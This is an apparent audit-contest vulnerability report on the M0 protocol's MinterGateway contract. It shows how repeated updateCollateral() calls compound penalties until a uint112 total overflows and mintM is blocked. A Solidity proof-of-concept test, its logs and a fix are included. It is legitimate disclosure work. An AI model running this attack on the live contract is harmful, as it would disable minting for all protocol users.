Salty Chili Cormorant

high

# Malicious minters can repeatedly penalize their undercollateralized accounts in a short peroid of time, which can result in disfunctioning of critical protocol functions, such as `mintM`.

## Summary

Malicious minters can exploit the `updateCollateral()` function to repeatedly penalize their undercollateralized accounts in a short peroid of time. This can make the `principalOfTotalActiveOwedM` to reach `uint112.max` limit, disfunctioning some critical functions, such as `mintM`.

## Vulnerability Detail

The `updateCollateral()` function allows minters to update their collateral status to the protocol, with penalties imposed in two scenarios:

1. A penalty is imposed for each missing collateral update interval.
2. A penalty is imposed if a minter is undercollateralized.

The critical issue arises with the penalty for being undercollateralized, which is imposed on each call to `updateCollateral()`. This penalty is compounded, calculated as `penaltyRate * (principalOfActiveOwedM_ - principalOfMaxAllowedActiveOwedM_)`, and the `principalOfActiveOwedM_` increases with each imposed penalty.

Given that validator provides timely information about the off-chain collateral (according to https://docs.m0.org/portal/overview/glossary#validator), a minter could potentially gather validator signatures with high frequency (for example, every minute). With a sufficient collection of signatures, a malicious minter could launch an attack in a very short timeframe, not giving validators time to deactivate the minter.

## Proof Of Concept

We can do a simple calculation, using the numbers from unit tests, mintRatio=90%, penaltyRate=1%, updateCollateralInterval=2000 (seconds). A malicious minter deposits `$100,000` t-bills as collateral, and mints `$90,000` M tokens. Since M tokens have 6 decimals, the collateral would be `100000e6`. Following the steps below, the malicious minter would be able to increase `principalOfActiveOwedM_` close to uint112.max limit:

1. Deposit collateral and mint M tokens.
2. Wait for 4 collateral update intervals. This is for accumulating some initial penalty to get undercollateralized.
3. Call `updateCollateral()`. The penalty for missing updates would be `4 * 90000e6 * 1% = 36e8`.
4. Starting from `36e8`, we can keep calling `updateCollateral()` to compound penalty for undercollateralization. Each time would increase the penalty by 1%. We only need `log(2^112 / 36e8, 1.01) ~ 5590` times to hit `uint112.max` limit.

Add the following testing code to `MinterGateway.t.sol`. We can see in logs that `principalOfTotalActiveOwedM` has hit uint112.max limit.

```bash
  penalty: 1 94536959275 94536000000
  penalty: 2 95482328867 95481360000
  penalty: 3 96437152156 96436173600
  penalty: 4 97401523678 97400535336
  penalty: 5 98375538914 98374540689
  penalty: 6 99359294302 99358286095
  penalty: 7 100352887244 100351868955
  penalty: 8 101356416116 101355387644
  penalty: 9 102369980277 102368941520
  penalty: 10 103393680080 103392630935
  ...
  penalty: 5990 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5991 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5992 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5993 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5994 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5995 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5996 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5997 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5998 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 5999 5192349545726433803396851311815959 5192296858534827628530496329220095
  penalty: 6000 5192349545726433803396851311815959 5192296858534827628530496329220095
```

```solidity
    // Using default test settings: mintRatio = 90%, penaltyRate = 1%, updateCollateralInterval = 2000.
    function test_penaltyForUndercollateralization() external {
        // 1. Minter1 deposits $100,000 t-bills, and mints 90,000 $M Tokens.
        uint initialTimestamp = block.timestamp;
        _minterGateway.setCollateralOf(_minter1, 100000e6);
        _minterGateway.setUpdateTimestampOf(_minter1, initialTimestamp);
        _minterGateway.setRawOwedMOf(_minter1, 90000e6);
        _minterGateway.setPrincipalOfTotalActiveOwedM(90000e6);

        // 2. Minter does not update for 4 updateCollateralIntervals, causing penalty for missing updates.
        vm.warp(initialTimestamp + 4 * _updateCollateralInterval);

        // 3. Minter fetches a lot of signatures from validator, each with different timestamp and calls `updateCollateral()` many times.
        //    Since the penalty for uncollateralization is counted every time, and would hit `uint112.max` at last.
        uint256[] memory retrievalIds = new uint256[](0);
        address[] memory validators = new address[](1);
        validators[0] = _validator1;

        for (uint i = 1; i <= 6000; ++i) {

            uint256[] memory timestamps = new uint256[](1);
            uint256 signatureTimestamp = initialTimestamp + i;
            timestamps[0] = signatureTimestamp;
            bytes[] memory signatures = new bytes[](1);
            signatures[0] = _getCollateralUpdateSignature(
                address(_minterGateway),
                _minter1,
                100000e6,
                retrievalIds,
                bytes32(0),
                signatureTimestamp,
                _validator1Pk
            );

            vm.prank(_minter1);
            _minterGateway.updateCollateral(100000e6, retrievalIds, bytes32(0), validators, timestamps, signatures);

            console.log("penalty:", i, _minterGateway.totalActiveOwedM(), _minterGateway.principalOfTotalActiveOwedM());
        }
    }
```

Note that in real use case, the penalty rate may lower (e.g. 0.1%), however, `log(2^112 / 36e8, 1.001) ~ 55656` is still a reasonable amount since there are 1440 minutes in 1 day (not to mention if the frequency for signature may be higher than once per minute). A malicious minter can still gather enough signatures for the attack.

## Impact

The direct impact is that `principalOfTotalActiveOwedM` will hit `uint112.max` limit. All related protocol features would be disfunctioned, the most important one being `mintM`, since the function would revert if `principalOfTotalActiveOwedM` hits uint112.max limit.

```solidity
        unchecked {
            uint256 newPrincipalOfTotalActiveOwedM_ = uint256(principalOfTotalActiveOwedM_) + principalAmount_;

            // As an edge case precaution, prevent a mint that, if all owed M (active and inactive) was converted to
            // a principal active amount, would overflow the `uint112 principalOfTotalActiveOwedM`.
>           if (
>               // NOTE: Round the principal up for worst case.
>               newPrincipalOfTotalActiveOwedM_ + _getPrincipalAmountRoundedUp(totalInactiveOwedM) >= type(uint112).max
>           ) {
>               revert OverflowsPrincipalOfTotalOwedM();
>           }

            principalOfTotalActiveOwedM = uint112(newPrincipalOfTotalActiveOwedM_);
            _rawOwedM[msg.sender] += principalAmount_; // Treat rawOwedM as principal since minter is active.
        }
```

## Code Snippet

- https://github.com/MZero-Labs/protocol/blob/main/src/MinterGateway.sol#L206
- https://github.com/MZero-Labs/protocol/blob/main/src/MinterGateway.sol#L303-L308

## Tool used

Foundary

## Recommendation

Consider only imposing penalty for undercollateralization for each update interval.
